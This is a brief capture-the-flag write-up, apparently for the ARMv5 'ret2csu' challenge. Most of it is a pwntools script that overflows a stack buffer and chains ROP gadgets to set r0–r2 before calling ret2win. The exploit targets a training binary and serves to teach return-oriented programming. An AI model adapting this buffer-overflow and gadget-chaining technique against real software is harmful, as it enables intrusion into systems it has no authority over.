![](../img/ret2csu_arm-1782615036016.webp)

![](../img/ret2csu_arm-1782615058278.webp)

theres a ret2win function in plt that print out the flag but require us to set r0 r1 and r2

![](../img/ret2csu_arm-1782615172567.webp)

![](../img/ret2csu_arm-1782615181452.webp)

![](../img/ret2csu_arm-1782615189702.webp)

setting the gdb into arm mode and inspecting the executable section, we got ourself some handy gadget that should let us finish this challenge

```
#!/usr/bin/python3
from pwn import *

context.os="linux"
context.log_level="debug"

context.binary=exe=ELF("./ret2csu_armv5-hf")
lib=ELF("./libret2csu_armv5-hf.so")

p=process(["qemu-arm","-L", "/usr/arm-linux-gnueabihf","-g","1234","./ret2csu_armv5-hf"])
# p=process(["qemu-arm","./ret2csu_armv5-hf"])

buffer=0x24*b"A"
pop_r3pc=0x10638
mov_r0r3_popr11pc=0x105c8
pop_r1r2r4r5r6r7r8r12lrpc=0x10620

payload=flat(
    buffer,
    pop_r3pc,
    0Xdeadbeef,
    pop_r1r2r4r5r6r7r8r12lrpc,
    0xcafebabe,
    0xd00df00d,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    mov_r0r3_popr11pc,
    0,
    exe.plt["ret2win"]
)

p.recvuntil("> ")
p.send(payload)

p.interactive()
```